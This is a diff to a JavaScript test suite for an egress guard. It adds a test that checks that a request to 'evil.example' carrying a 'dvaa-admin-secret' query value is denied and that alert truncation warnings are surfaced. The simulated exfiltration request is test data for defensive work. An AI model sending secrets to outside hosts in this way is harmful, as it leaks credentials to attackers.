@@ -179,3 +179,23 @@ test('latency on data-rich inputs is recorded (median/p95 over 200 runs of a 60 
   console.log(`# egress scan latency 60KiB body: median=${med}ms p95=${p95}ms`);
   assert.ok(p95 < DEFAULTS.SCAN_BUDGET_MS, `p95 ${p95}ms within scan budget`);
 });
+
+// #112 CRITIC-C #12: T4 alert-schema warnings from the egress guard used to be swallowed (`onWarning: () => {}`).
+test('egress alert-schema truncation warnings are surfaced (injected sink + default stderr line), verdict unchanged', () => {
+  const longPath = '/' + 'a'.repeat(3000); // > MAX_STRING_CHARS=2048 for Sink.Destination
+  const warnings = [];
+  const v = inspectEgress(http(`http://evil.example:9${longPath}?d=dvaa-admin-secret`), { ...cfg('block', []), onAlertWarning: (m) => warnings.push(m) });
+  assert.equal(v.action, 'deny');
+  assert.ok(v.alertDoc, 'alert built');
+  assert.ok(warnings.some((m) => /truncated/.test(m)), `truncation warning surfaced, got ${JSON.stringify(warnings)}`);
+
+  const orig = process.stderr.write;
+  const lines = [];
+  process.stderr.write = (chunk, ...rest) => { lines.push(String(chunk)); return true; };
+  try {
+    inspectEgress(http(`http://evil.example:9${longPath}?d=dvaa-admin-secret`), cfg('block', []));
+  } finally {
+    process.stderr.write = orig;
+  }
+  assert.ok(lines.some((l) => l.startsWith('WARN sentinel-egress alert_schema ') && /truncated/.test(l)), `stderr WARN line, got ${JSON.stringify(lines)}`);
+});
